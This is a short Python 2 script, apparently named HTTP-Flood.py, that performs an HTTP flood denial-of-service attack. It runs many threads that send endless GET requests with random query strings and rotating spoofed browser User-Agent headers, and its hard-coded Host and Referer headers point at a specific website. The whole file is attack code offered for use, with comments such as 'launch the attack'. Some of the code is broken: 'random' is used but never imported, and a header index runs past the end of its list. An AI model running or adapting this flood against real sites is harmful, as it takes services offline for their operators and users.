from time import sleep
import thread
import os
import sys
from requests import get

if len(sys.argv) != 3:
	print "Usage - ./HTTP-Flood.py [baseUri] [Threads]"
	print "Example - ./TCP-Flood.py http://shoreqs.top/?s= 32"
	sys.exit()

baseUri = str(sys.argv[1])
threads = int(sys.argv[2])

## Make sure target website is alive
assert len(get(baseUri+'test',timeout=10).content)>0 , 'Website is not alive'
print(get(baseUri+'test',timeout=10).content)

## Set Target URL,search engine generally...
randStr = lambda x: "".join(map(chr, (ord('a')+(random.randint(0,26)) for y in range(x))))

## Generate Header Randomly...
agentTable = [
			'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14',
			'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0',
			'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3"',
			'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
			'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7"',
			'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
			'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1']
header = {
'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'Accept-Encoding':'gzip, deflate, sdch',
'Accept-Language':'zh-CN,zh;q=0.8',
'Cache-Control':'max-age=0',
'Connection':'keep-alive',
'Host':'shoreqs.top',
'Referer':'http://shoreqs.top/',
'User-Agent':'Default'
}
headerTable = []
for i in range(len(agentTable)):
    nheader = header.copy()
    nheader['User-Agent'] = agentTable[i]
    headerTable.append(nheader)


def HTTPFlood(baseUri,randStr):
	while True:
		try:
			header = headerTable[random.randint(0,7)]
			uri = baseUri + randStr(random.randint(0,13))
			co = len(get(uri,headers = header).content)
		except:
			pass
## Spin up multiple threads to launch the attack
print "use Ctrl+C to stop the attack"
for x in range(0,threads):
	thread.start_new_thread(HTTPFlood, (baseUri,randStr))

## Make it go FOREVER (...or at least until Ctrl+C)
while True:
	sleep(1)
